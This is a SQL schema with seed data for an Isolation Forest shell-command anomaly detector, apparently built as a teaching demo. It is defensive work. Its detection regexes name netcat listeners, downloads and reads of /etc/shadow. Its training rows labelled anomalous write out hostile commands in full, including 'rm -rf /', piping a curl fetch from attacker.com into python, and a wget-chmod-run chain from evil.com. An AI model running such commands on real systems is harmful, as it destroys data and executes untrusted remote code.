-- SQL schema for Isolation Forest anomaly detection system
-- This stores training patterns, feature configurations, and model parameters

-- Table for Isolation Forest model configuration
CREATE TABLE IF NOT EXISTS isolation_forest_config (
    id INT AUTO_INCREMENT PRIMARY KEY,
    model_name VARCHAR(100) NOT NULL UNIQUE,
    n_trees INT DEFAULT 100,
    max_depth INT DEFAULT 8,
    contamination DECIMAL(3,2) DEFAULT 0.10,
    sample_size INT DEFAULT 256,
    threshold DECIMAL(3,2) DEFAULT 0.60,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    is_active BOOLEAN DEFAULT TRUE
);

-- Table for feature extraction patterns and weights
CREATE TABLE IF NOT EXISTS anomaly_feature_patterns (
    id INT AUTO_INCREMENT PRIMARY KEY,
    pattern_name VARCHAR(100) NOT NULL,
    pattern_regex VARCHAR(500) NOT NULL,
    feature_type ENUM('suspicious_commands', 'network_activity', 'file_access', 'script_execution', 'urls', 'special_chars') NOT NULL,
    boost_value DECIMAL(3,2) NOT NULL,
    description TEXT,
    severity ENUM('Low', 'Medium', 'High') DEFAULT 'Medium',
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table for training data patterns (normal and anomalous)
CREATE TABLE IF NOT EXISTS isolation_forest_training_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    command_pattern VARCHAR(500) NOT NULL,
    label ENUM('normal', 'anomalous') NOT NULL,
    command_length INT,
    arg_count INT,
    special_chars_count INT,
    path_separators_count INT,
    session_context JSON, -- Store session stats as JSON
    feature_vector JSON, -- Store 14-dimensional feature vector
    description TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Table for educational boosting configuration
CREATE TABLE IF NOT EXISTS anomaly_boost_config (
    id INT AUTO_INCREMENT PRIMARY KEY,
    config_name VARCHAR(100) NOT NULL UNIQUE,
    suspicious_commands_boost DECIMAL(3,2) DEFAULT 0.20,
    network_activity_boost DECIMAL(3,2) DEFAULT 0.15,
    file_access_boost DECIMAL(3,2) DEFAULT 0.25,
    script_execution_boost DECIMAL(3,2) DEFAULT 0.12,
    url_patterns_boost DECIMAL(3,2) DEFAULT 0.10,
    special_chars_boost DECIMAL(3,2) DEFAULT 0.08,
    max_score_cap DECIMAL(3,2) DEFAULT 0.90,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insert default Isolation Forest configuration
INSERT INTO isolation_forest_config (model_name, n_trees, max_depth, contamination, sample_size, threshold) VALUES
('hybrid_detection', 100, 8, 0.10, 256, 0.60),
('educational_demo', 50, 6, 0.15, 128, 0.50);

-- Insert feature patterns for anomaly detection
INSERT INTO anomaly_feature_patterns (pattern_name, pattern_regex, feature_type, boost_value, description, severity) VALUES
('dangerous_removal', 'rm\\s+-rf\\s+', 'suspicious_commands', 0.25, 'Dangerous file removal operations', 'High'),
('network_scanning', 'nmap\\s+.*', 'network_activity', 0.20, 'Network scanning with nmap', 'High'),
('wget_downloads', 'wget\\s+.*', 'network_activity', 0.15, 'File downloads using wget', 'Medium'),
('curl_downloads', 'curl\\s+.*', 'network_activity', 0.15, 'File downloads using curl', 'Medium'),
('sensitive_file_cat', 'cat\\s+.*\\/etc\\/(passwd|shadow|hosts)', 'file_access', 0.30, 'Access to sensitive system files', 'High'),
('chmod_executable', 'chmod\\s+\\+x\\s+.*', 'script_execution', 0.18, 'Making files executable', 'Medium'),
('script_execution', '\\.\\/.*', 'script_execution', 0.15, 'Direct script execution', 'Medium'),
('python_oneliners', 'python\\s+-c\\s+.*', 'script_execution', 0.20, 'Python one-liner execution', 'High'),
('bash_oneliners', 'bash\\s+-c\\s+.*', 'script_execution', 0.20, 'Bash one-liner execution', 'High'),
('http_urls', 'https?:\\/\\/.*', 'urls', 0.12, 'HTTP/HTTPS URLs in commands', 'Medium'),
('ftp_urls', 'ftp:\\/\\/.*', 'urls', 0.15, 'FTP URLs in commands', 'Medium'),
('pipe_chains', '.*\\|.*\\|.*', 'special_chars', 0.10, 'Complex pipe chains', 'Low'),
('background_processes', '.*&\\s*$', 'special_chars', 0.08, 'Background process execution', 'Low'),
('ssh_forwarding', 'ssh\\s+.*-[LRD]\\s+.*', 'network_activity', 0.18, 'SSH port forwarding', 'High'),
('netcat_listeners', 'nc\\s+.*-l\\s+.*', 'network_activity', 0.22, 'Netcat listeners', 'High');

-- Insert training data patterns
INSERT INTO isolation_forest_training_data (command_pattern, label, command_length, arg_count, special_chars_count, path_separators_count, description) VALUES
-- Normal patterns
('ls', 'normal', 2, 0, 0, 0, 'Basic directory listing'),
('cd /home/user', 'normal', 13, 1, 0, 2, 'Directory navigation'),
('cat file.txt', 'normal', 12, 1, 0, 0, 'Reading normal file'),
('git status', 'normal', 10, 1, 0, 0, 'Git status check'),
('npm install', 'normal', 11, 1, 0, 0, 'Package installation'),
('python script.py', 'normal', 16, 1, 0, 0, 'Normal Python script execution'),
('vim file.js', 'normal', 11, 1, 0, 0, 'File editing'),
('mkdir project', 'normal', 13, 1, 0, 0, 'Directory creation'),
('cp file1 file2', 'normal', 14, 2, 0, 0, 'File copying'),
('mv old new', 'normal', 9, 2, 0, 0, 'File moving'),
('grep pattern file', 'normal', 17, 2, 0, 0, 'Pattern searching'),
('find . -name "*.js"', 'normal', 18, 3, 2, 1, 'File searching'),
-- Anomalous patterns
('rm -rf /', 'anomalous', 8, 2, 0, 1, 'Dangerous system deletion'),
('wget http://evil.com/malware.sh', 'anomalous', 33, 1, 4, 4, 'Malicious file download'),
('chmod +x malware', 'anomalous', 15, 2, 1, 0, 'Making malware executable'),
('nc -l 4444', 'anomalous', 10, 2, 0, 0, 'Netcat backdoor listener'),
('nmap -sS target', 'anomalous', 14, 2, 0, 0, 'Stealth port scanning'),
('cat /etc/passwd', 'anomalous', 14, 1, 0, 2, 'Sensitive file access'),
('sudo su -', 'anomalous', 8, 2, 0, 0, 'Privilege escalation'),
('python -c "import os; os.system(\'rm -rf /\')"', 'anomalous', 45, 2, 8, 1, 'Python-based system destruction'),
('curl http://attacker.com/payload.py | python', 'anomalous', 45, 1, 6, 4, 'Remote code execution'),
('ssh user@target -L 8080:localhost:22', 'anomalous', 35, 3, 2, 0, 'SSH tunneling'),
('./backdoor &', 'anomalous', 12, 1, 1, 1, 'Background backdoor execution'),
('bash -c "wget http://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh"', 'anomalous', 73, 2, 9, 4, 'Complex malware deployment');

-- Insert educational boosting configuration
INSERT INTO anomaly_boost_config (config_name, suspicious_commands_boost, network_activity_boost, file_access_boost, script_execution_boost, url_patterns_boost, special_chars_boost, max_score_cap) VALUES
('hybrid_conservative', 0.20, 0.15, 0.25, 0.12, 0.10, 0.08, 0.90),
('standalone_educational', 0.30, 0.25, 0.40, 0.20, 0.15, 0.10, 1.00),
('production_minimal', 0.10, 0.08, 0.12, 0.06, 0.05, 0.03, 0.80);
